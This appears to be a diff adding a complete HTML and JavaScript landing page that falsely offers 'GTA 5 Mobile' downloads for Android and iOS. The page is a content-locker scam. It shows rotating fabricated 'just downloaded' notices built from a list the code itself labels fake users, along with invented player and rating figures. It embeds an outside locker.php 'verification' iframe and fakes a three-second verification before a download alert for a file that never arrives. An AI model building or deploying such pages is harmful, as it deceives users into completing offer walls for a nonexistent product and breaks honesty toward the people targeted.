@@ -1,0 +1,788 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Download GTA 5 Mobile for Android and iOS. Enjoy the full open-world experience of Grand Theft Auto V optimized for mobile devices.">
+    <title>GTA 5 Mobile | Download for Android & iOS</title>
+    <link href="https://fonts.googleapis.com/css2?family=Oswald:wght@700&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        :root {
+            --gta-green: #38ef7d;
+            --dark-bg: #0b0c0d;
+            --modal-bg: #222324;
+            --card-outline: rgba(56, 239, 125, 0.3);
+        }
+
+        * { 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box; 
+            -webkit-tap-highlight-color: transparent; 
+            -webkit-overflow-scrolling: touch;
+        }
+        
+        html {
+            scroll-behavior: smooth;
+        }
+        
+        body { 
+            font-family: 'Poppins', sans-serif; 
+            background-color: var(--dark-bg); 
+            color: white; 
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
+
+        /* --- Background & Overlay --- */
+        .main-bg {
+            background: linear-gradient(rgba(0,0,0,0.6), rgba(0,0,0,0.9)), 
+                        url('https://media-rockstargames-com.akamaized.net/rockstargames-newsite/img/global/games/fob/mobile/grand-theft-auto-v.jpg') center/cover no-repeat;
+            min-height: 100vh;
+            padding: 40px 20px;
+            background-attachment: scroll;
+        }
+
+        /* --- Fake Top Notification --- */
+        .top-notif {
+            position: fixed; 
+            top: 10px; 
+            left: 15px; 
+            right: 15px;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(10px); 
+            padding: 10px 15px; 
+            border-radius: 30px;
+            font-size: 0.75rem; 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+            z-index: 100;
+            border: 1px solid rgba(56, 239, 125, 0.2);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            max-width: calc(100% - 30px);
+            transition: opacity 0.3s ease;
+        }
+
+        .top-notif i {
+            color: var(--gta-green);
+        }
+
+        /* --- Header --- */
+        header { 
+            text-align: left; 
+            margin-bottom: 30px; 
+            margin-top: 40px;
+        }
+        
+        .logo { 
+            width: 80px; 
+            margin-bottom: 15px;
+            image-rendering: -webkit-optimize-contrast;
+        }
+        
+        h1 { 
+            font-family: 'Oswald', sans-serif; 
+            font-size: 2.6rem; 
+            line-height: 1; 
+            text-transform: uppercase; 
+            letter-spacing: 0.5px;
+        }
+        
+        h1 span { 
+            color: var(--gta-green); 
+        }
+        
+        .hero-desc { 
+            font-size: 0.85rem; 
+            color: #ccc; 
+            margin-top: 15px; 
+            max-width: 90%;
+            line-height: 1.5;
+        }
+
+        /* --- Gallery Section --- */
+        .gallery-title { 
+            font-family: 'Oswald'; 
+            margin: 30px 0 15px; 
+            font-size: 1.4rem; 
+            font-weight: 700;
+        }
+        
+        .gallery-scroll { 
+            display: flex; 
+            gap: 12px; 
+            overflow-x: auto; 
+            padding-bottom: 10px; 
+            scrollbar-width: none;
+            -webkit-overflow-scrolling: touch;
+        }
+        
+        .gallery-scroll img { 
+            width: 260px; 
+            border-radius: 12px; 
+            border: 1px solid #333;
+            image-rendering: -webkit-optimize-contrast;
+        }
+        
+        .gallery-scroll::-webkit-scrollbar { 
+            display: none; 
+        }
+
+        /* --- Stats Row --- */
+        .stats-row { 
+            display: flex; 
+            justify-content: space-between; 
+            margin-top: 15px; 
+            font-size: 0.7rem; 
+            color: #999; 
+            border-bottom: 1px solid #222; 
+            padding-bottom: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .stats-row span i { 
+            color: gold; 
+            margin-right: 3px; 
+        }
+
+        /* --- Verification Explanation --- */
+        .verification-explanation {
+            background: rgba(56, 239, 125, 0.1);
+            border: 1px solid rgba(56, 239, 125, 0.3);
+            border-radius: 10px;
+            padding: 12px 15px;
+            margin: 20px 0;
+            font-size: 0.8rem;
+            text-align: center;
+            color: #e0e0e0;
+            display: none;
+        }
+        
+        .verification-explanation i {
+            color: var(--gta-green);
+            margin-right: 8px;
+        }
+
+        /* --- Floating Download Button --- */
+        .floating-cta {
+            position: fixed; 
+            bottom: 20px; 
+            left: 50%; 
+            transform: translateX(-50%);
+            width: 90%; 
+            z-index: 500;
+            animation: slideUp 0.5s ease-out;
+        }
+        
+        @keyframes slideUp {
+            from { bottom: -100px; opacity: 0; }
+            to { bottom: 20px; opacity: 1; }
+        }
+        
+        .btn-green {
+            background: var(--gta-green); 
+            color: black; 
+            padding: 18px; 
+            border-radius: 12px;
+            display: block; 
+            text-align: center; 
+            font-weight: 800; 
+            text-decoration: none;
+            font-size: 1.1rem; 
+            box-shadow: 0 10px 20px rgba(56, 239, 125, 0.3);
+            transition: all 0.2s ease;
+            border: none;
+            cursor: pointer;
+            min-height: 60px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            touch-action: manipulation;
+        }
+        
+        .btn-green:active {
+            transform: scale(0.98);
+            box-shadow: 0 5px 15px rgba(56, 239, 125, 0.3);
+        }
+        
+        .btn-green i {
+            font-size: 1.2rem;
+        }
+
+        /* --- Modal --- */
+        .modal-overlay {
+            position: fixed; 
+            inset: 0; 
+            background: rgba(0,0,0,0.85); 
+            display: none; 
+            align-items: center; 
+            justify-content: center; 
+            z-index: 1000;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+            padding: 20px;
+        }
+        
+        .modal-overlay.active {
+            display: flex;
+            opacity: 1;
+            animation: fadeIn 0.3s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .modal-box {
+            background: var(--modal-bg); 
+            width: 100%; 
+            max-width: 400px; 
+            padding: 25px;
+            border-radius: 20px; 
+            position: relative; 
+            border: 1px solid #333;
+            transform: translateY(20px);
+            transition: transform 0.3s ease;
+        }
+        
+        .modal-overlay.active .modal-box {
+            transform: translateY(0);
+        }
+        
+        .close-btn { 
+            position: absolute; 
+            top: 15px; 
+            right: 15px; 
+            color: #666; 
+            font-size: 1.2rem; 
+            cursor: pointer;
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+        }
+        
+        .close-btn:active {
+            background: rgba(255, 255, 255, 0.1);
+        }
+
+        /* --- Device Selector --- */
+        .device-selector { 
+            display: flex; 
+            gap: 10px; 
+            margin: 20px 0; 
+        }
+        
+        .device-card {
+            flex: 1; 
+            background: #2d2e2f; 
+            padding: 20px 10px; 
+            border-radius: 15px;
+            text-align: center; 
+            border: 2px solid transparent; 
+            transition: all 0.2s ease;
+            cursor: pointer;
+            touch-action: manipulation;
+        }
+        
+        .device-card:active {
+            transform: scale(0.95);
+        }
+        
+        .device-card.active { 
+            border-color: var(--gta-green); 
+            background: rgba(56, 239, 125, 0.05); 
+        }
+        
+        .device-card i { 
+            font-size: 1.8rem; 
+            margin-bottom: 8px; 
+            display: block; 
+        }
+        
+        .device-card span { 
+            font-size: 0.75rem; 
+            font-weight: 600; 
+        }
+
+        /* --- Locker Step --- */
+        #locker-step { 
+            display: none; 
+            margin-top: 20px; 
+        }
+        
+        .locker-card {
+            background: #1a1b1c; 
+            border-radius: 15px; 
+            padding: 20px;
+            border: 1px solid var(--card-outline); 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between;
+            margin-bottom: 15px;
+        }
+        
+        .locker-card .circle-num {
+            width: 35px; 
+            height: 35px; 
+            border-radius: 50%; 
+            border: 2px solid var(--gta-green);
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            color: var(--gta-green); 
+            font-weight: bold;
+        }
+        
+        iframe { 
+            width: 100%; 
+            height: 380px; 
+            border: none; 
+            margin-top: 15px; 
+            border-radius: 10px;
+            background: #1a1b1c;
+        }
+        
+        .locker-header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        
+        .locker-header h4 {
+            font-size: 1rem;
+            color: var(--gta-green);
+            margin-bottom: 5px;
+        }
+        
+        .locker-header p {
+            font-size: 0.8rem;
+            color: #aaa;
+        }
+
+        /* --- Final Step --- */
+        .final-step {
+            text-align: center;
+            padding: 20px;
+            display: none;
+        }
+        
+        .final-step i {
+            font-size: 3rem;
+            color: var(--gta-green);
+            margin-bottom: 15px;
+        }
+        
+        .final-step h4 {
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+        }
+        
+        .final-step p {
+            font-size: 0.9rem;
+            color: #aaa;
+            margin-bottom: 20px;
+        }
+
+        /* --- Footer --- */
+        footer {
+            text-align: center;
+            margin-top: 40px;
+            padding-top: 20px;
+            border-top: 1px solid #222;
+            font-size: 0.7rem;
+            color: #666;
+        }
+
+        /* --- Performance Optimizations --- */
+        img {
+            content-visibility: auto;
+        }
+        
+        @media (max-width: 480px) {
+            h1 {
+                font-size: 2.4rem;
+            }
+            
+            .btn-green {
+                padding: 16px;
+                font-size: 1rem;
+            }
+            
+            .modal-box {
+                padding: 20px;
+            }
+        }
+        
+        @media (max-width: 360px) {
+            h1 {
+                font-size: 2.2rem;
+            }
+            
+            .gallery-scroll img {
+                width: 220px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="main-bg">
+        <div class="top-notif" id="topNotification">
+            <i class="fas fa-user-circle"></i> 
+            <span id="notificationText">User_887 just downloaded for Android</span>
+        </div>
+
+        <header>
+            <img src="https://i.pinimg.com/1200x/57/43/cb/5743cb782cb73bd8b2e2b0acc876c1e5.jpg" 
+                 class="logo" 
+                 alt="GTA 5 Logo">
+            <h1>GTA 5 <span>Mobile</span></h1>
+            <p class="hero-desc">Experience the full Grand Theft Auto V world on your Android & iOS devices. High-definition immersive story for mobile performance.</p>
+        </header>
+
+        <h2 class="gallery-title">Vast Open World</h2>
+        <div class="gallery-scroll">
+            <img src="https://i.ytimg.com/vi/8qsumch7S_s/maxresdefault.jpg" 
+                 alt="GTA 5 Mobile open world gameplay" 
+                 loading="lazy">
+            <img src="https://i.ytimg.com/vi/CNTf5JOCuCE/maxresdefault.jpg" 
+                 alt="GTA 5 Mobile graphics and visuals" 
+                 loading="lazy">
+            <img src="https://i.pinimg.com/1200x/b3/cd/c9/b3cdc9fb37ac8dee4bf428dff3453467.jpg" 
+                 alt="GTA 5 Mobile gameplay screenshot" 
+                 loading="lazy">
+        </div>
+
+        <div class="stats-row">
+            <span>1.2M+ Players</span>
+            <span>4.8 <i class="fas fa-star"></i> Rating</span>
+            <span>24/7 Online Support</span>
+        </div>
+
+        <footer>
+            Privacy Policy | Terms & Service
+        </footer>
+    </div>
+
+    <div class="floating-cta">
+        <button class="btn-green" onclick="openModal()" id="mainCTA">
+            <i class="fas fa-download"></i> Get GTA 5 on Your Phone
+        </button>
+    </div>
+
+    <div class="modal-overlay" id="modalOverlay">
+        <div class="modal-box">
+            <span class="close-btn" onclick="closeModal()">
+                <i class="fas fa-times"></i>
+            </span>
+            
+            <h3 style="text-align: center; font-size: 1rem;">Select Your Device</h3>
+            
+            <div id="selection-step">
+                <div class="device-selector">
+                    <div class="device-card" id="android-btn" onclick="selectDevice('android')">
+                        <i class="fab fa-android" style="color: #a4c639;"></i>
+                        <span>Android (APK)</span>
+                    </div>
+                    <div class="device-card" id="ios-btn" onclick="selectDevice('ios')">
+                        <i class="fab fa-apple"></i>
+                        <span>iOS (Phone/Pad)</span>
+                    </div>
+                </div>
+
+                <div class="verification-explanation" id="verificationExplain">
+                    <i class="fas fa-shield-alt"></i>
+                    Complete one quick step to unlock the download
+                </div>
+
+                <div id="locker-trigger" style="display:none;">
+                    <a href="javascript:void(0)" class="btn-green" onclick="showLocker()" style="font-size: 0.9rem; padding: 12px;">
+                        <i class="fas fa-unlock-alt"></i> Unlock Download
+                    </a>
+                </div>
+            </div>
+
+            <div id="locker-step">
+                <div class="locker-header">
+                    <h4>Final Step: Verify & Download</h4>
+                    <p>Complete verification to start your download</p>
+                </div>
+                
+                <div class="locker-card">
+                    <div style="display: flex; align-items: center; gap: 10px;">
+                        <div class="circle-num">1</div>
+                        <span style="font-size: 0.9rem; font-weight: 600;">Complete Verification</span>
+                    </div>
+                    <i class="fas fa-check-circle" style="color: #555;"></i>
+                </div>
+                
+                <iframe id="verificationFrame" src="about:blank"></iframe>
+                
+                <div class="final-step" id="finalStep">
+                    <i class="fas fa-check-circle"></i>
+                    <h4>Verification Complete!</h4>
+                    <p>Your download will start automatically</p>
+                    <button class="btn-green" onclick="startDownload()" style="margin-top: 10px;">
+                        <i class="fas fa-download"></i> Start Download Now
+                    </button>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <audio id="clickSfx" preload="auto">
+        <source src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3" type="audio/mpeg">
+    </audio>
+
+    <script>
+        // Performance optimizations
+        'use strict';
+        
+        // DOM elements
+        const clickSfx = document.getElementById('clickSfx');
+        const modal = document.getElementById('modalOverlay');
+        const topNotification = document.getElementById('topNotification');
+        const notificationText = document.getElementById('notificationText');
+        const mainCTA = document.getElementById('mainCTA');
+        const verificationExplain = document.getElementById('verificationExplain');
+        const verificationFrame = document.getElementById('verificationFrame');
+        const finalStep = document.getElementById('finalStep');
+
+        // State variables
+        let selectedDevice = null;
+        let notificationInterval;
+        let ctaVariants = [
+            {text: "Get GTA 5 on Your Phone", icon: "fa-mobile"},
+            {text: "Download GTA 5 Mobile Now", icon: "fa-download"},
+            {text: "Play GTA 5 on Mobile", icon: "fa-gamepad"}
+        ];
+        let currentCtaIndex = 0;
+
+        // Fake user data for notifications
+        const fakeUsers = [
+            'Alex_', 'Gamer_', 'Player_', 'Mike_', 'Sarah_', 'John_', 'GTALover_', 'LosSantos_',
+            'Trevor_', 'Michael_', 'Franklin_', 'Heist_', 'ViceCity_', 'SanAndreas_'
+        ];
+        const devices = ['Android', 'iOS'];
+        const actions = [
+            'just downloaded for',
+            'is playing on',
+            'installed on',
+            'started playing on',
+            'got GTA 5 on'
+        ];
+
+        // Initialize
+        function init() {
+            // Start dynamic notifications
+            startDynamicNotifications();
+            
+            // Rotate CTA text
+            rotateCTAText();
+            
+            // Preload critical assets
+            preloadAssets();
+            
+            // Add touch event listeners for haptic feedback
+            setupHapticFeedback();
+            
+            // Set initial verification frame
+            verificationFrame.src = 'https://d2xohqmdyl2cj3.cloudfront.net/public/locker.php?it=4321081&key=db20f';
+            
+            // Performance monitoring
+            if ('connection' in navigator) {
+                console.log('Network type:', navigator.connection.effectiveType);
+            }
+        }
+
+        // Dynamic notifications
+        function startDynamicNotifications() {
+            updateNotification();
+            notificationInterval = setInterval(updateNotification, 4000); // Update every 4 seconds
+        }
+
+        function updateNotification() {
+            const randomUser = fakeUsers[Math.floor(Math.random() * fakeUsers.length)] + 
+                             Math.floor(Math.random() * 9000 + 1000);
+            const randomDevice = devices[Math.floor(Math.random() * devices.length)];
+            const randomAction = actions[Math.floor(Math.random() * actions.length)];
+            
+            notificationText.textContent = `${randomUser} ${randomAction} ${randomDevice}`;
+            
+            // Add subtle animation
+            topNotification.style.opacity = '0.8';
+            setTimeout(() => {
+                topNotification.style.opacity = '1';
+            }, 100);
+        }
+
+        // CTA text rotation
+        function rotateCTAText() {
+            setInterval(() => {
+                currentCtaIndex = (currentCtaIndex + 1) % ctaVariants.length;
+                const cta = ctaVariants[currentCtaIndex];
+                mainCTA.innerHTML = `<i class="fas ${cta.icon}"></i> ${cta.text}`;
+                
+                // Add subtle animation
+                mainCTA.style.transform = 'scale(0.98)';
+                setTimeout(() => {
+                    mainCTA.style.transform = 'scale(1)';
+                }, 150);
+            }, 8000); // Rotate every 8 seconds
+        }
+
+        // Haptic feedback
+        function setupHapticFeedback() {
+            const buttons = document.querySelectorAll('.btn-green, .device-card, .close-btn');
+            
+            buttons.forEach(button => {
+                button.addEventListener('touchstart', function() {
+                    if (navigator.vibrate) {
+                        navigator.vibrate(10); // Short vibration
+                    }
+                });
+                
+                button.addEventListener('touchend', function() {
+                    if (navigator.vibrate) {
+                        navigator.vibrate(0); // Stop vibration
+                    }
+                });
+            });
+        }
+
+        // Audio feedback
+        function playClick() {
+            try {
+                clickSfx.currentTime = 0;
+                clickSfx.play().catch(e => {
+                    // Silent fail for autoplay restrictions
+                    console.log('Audio play prevented:', e);
+                });
+            } catch (e) {
+                // Fallback silent
+            }
+        }
+
+        // Preload critical assets
+        function preloadAssets() {
+            const images = document.querySelectorAll('img[loading="lazy"]');
+            images.forEach(img => {
+                if (img.getAttribute('data-loaded') !== 'true') {
+                    img.setAttribute('data-loaded', 'true');
+                }
+            });
+        }
+
+        // Modal functions
+        function openModal() {
+            playClick();
+            modal.classList.add('active');
+            document.body.style.overflow = 'hidden';
+            
+            // Reset to first step
+            document.getElementById('selection-step').style.display = 'block';
+            document.getElementById('locker-step').style.display = 'none';
+            verificationExplain.style.display = 'none';
+            document.getElementById('locker-trigger').style.display = 'none';
+            finalStep.style.display = 'none';
+            verificationFrame.style.display = 'block';
+            
+            // Reset device selection
+            selectedDevice = null;
+            document.getElementById('android-btn').classList.remove('active');
+            document.getElementById('ios-btn').classList.remove('active');
+        }
+
+        function closeModal() {
+            playClick();
+            modal.classList.remove('active');
+            document.body.style.overflow = 'auto';
+            
+            // Clear interval if locker is active
+            clearInterval(notificationInterval);
+            startDynamicNotifications(); // Restart notifications
+        }
+
+        function selectDevice(device) {
+            playClick();
+            selectedDevice = device;
+            
+            document.getElementById('android-btn').classList.remove('active');
+            document.getElementById('ios-btn').classList.remove('active');
+            document.getElementById(device + '-btn').classList.add('active');
+            
+            // Show verification explanation
+            verificationExplain.style.display = 'block';
+            document.getElementById('locker-trigger').style.display = 'block';
+            
+            // Update CTA text based on device
+            const deviceText = device === 'android' ? 'Android' : 'iPhone/iPad';
+            mainCTA.innerHTML = `<i class="fas fa-download"></i> Get GTA 5 for ${deviceText}`;
+        }
+
+        function showLocker() {
+            playClick();
+            document.getElementById('selection-step').style.display = 'none';
+            document.getElementById('locker-step').style.display = 'block';
+            
+            // Simulate verification process
+            setTimeout(() => {
+                verificationFrame.style.display = 'none';
+                finalStep.style.display = 'block';
+                
+                // Update notification to show this user completed verification
+                const randomUser = fakeUsers[Math.floor(Math.random() * fakeUsers.length)] + 
+                                 Math.floor(Math.random() * 9000 + 1000);
+                notificationText.textContent = `${randomUser} completed verification`;
+            }, 3000); // Simulate 3 second verification
+        }
+
+        function startDownload() {
+            playClick();
+            
+            // Vibrate for download start
+            if (navigator.vibrate) {
+                navigator.vibrate([50, 30, 50]);
+            }
+            
+            // Show download confirmation
+            alert(`Starting download for ${selectedDevice === 'android' ? 'Android (4.2GB APK)' : 'iOS (3.8GB IPA)'}\n\nYour download will begin shortly...`);
+            
+            // Update notification
+            const randomUser = fakeUsers[Math.floor(Math.random() * fakeUsers.length)] + 
+                             Math.floor(Math.random() * 9000 + 1000);
+            notificationText.textContent = `${randomUser} started downloading`;
+            
+            closeModal();
+        }
+
+        // Keyboard navigation support
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' && modal.classList.contains('active')) {
+                closeModal();
+            }
+        });
+
+        // Touch optimization
+        document.addEventListener('touchstart', function() {}, {passive: true});
+
+        // Initialize on load
+        window.addEventListener('DOMContentLoaded', init);
+        
+        // Load event for performance tracking
+        window.addEventListener('load', function() {
+            console.log('Page fully loaded');
+            // Set main CTA to most urgent variant
+            mainCTA.innerHTML = `<i class="fas fa-download"></i> Download GTA 5 Mobile Now`;
+        });
+    </script>
+</body>
+</html>
